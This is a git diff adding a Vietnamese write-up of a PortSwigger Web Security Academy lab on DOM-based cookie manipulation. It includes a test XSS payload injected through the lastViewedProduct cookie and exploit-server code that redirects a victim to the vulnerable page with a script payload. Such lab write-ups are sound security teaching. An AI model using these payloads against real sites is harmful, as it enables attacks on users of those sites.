@@ -59,9 +59,26 @@ https://0ad800f0032df10ac4cb4d1300dd004e.web-security-academy.net/post?postId=5&
 Nếu user click "Black to blog" thì website sẽ tự động chuyển hướng đến exploit server.
 
 # 5. DOM-based cookie manipulation
+Trong source code của `GET /product` có đoạn script sau:
+
+![image](https://user-images.githubusercontent.com/103978452/211686424-cddbdabd-fafe-48f9-9fe0-b4125f062cb7.png)
+Như vậy mỗi khi truy cập đến một product, biến window.location sẽ được đặt làm giá trị của cookie lastViewedProduct. 
+
+Thử thay đổi cookie lastViewedProduct thành `'><script>alert(1)</script>`, ta thấy lệnh `alert(1)` được execute. Như vậy website có lỗ hổng XSS, ta có thể đóng attribute href của thẻ `<a>` và inject thẻ `<script>`.
+
+Vào exploit server, cấu hình đoạn code sau:
+
+```
+<script>
+document.location='https://0a01001f03664060c1505dad001d00ec.web-security-academy.net/product?productId=3&data=%27%3E%3Cscript%3Eprint()%3C/script%3E'
+</script>
+```
+
+Đoạn code trên sẽ redirect victim tới trang product chứa lỗ hổng XSS, với payload được chèn vào là thẻ script gọi lệnh `print()`. Như vậy khi victim refresh lại trang hoặc truy cập một product khác, lệnh `print()` sẽ được gọi.
+
+Sau khi click "Deliver exploit to victim", bài lab được giải thành công.
 
 # 6. Exploiting DOM clobbering to enable XSS
 
 # 7. Clobbering DOM attributes to bypass HTML filters
 
-# 8. 
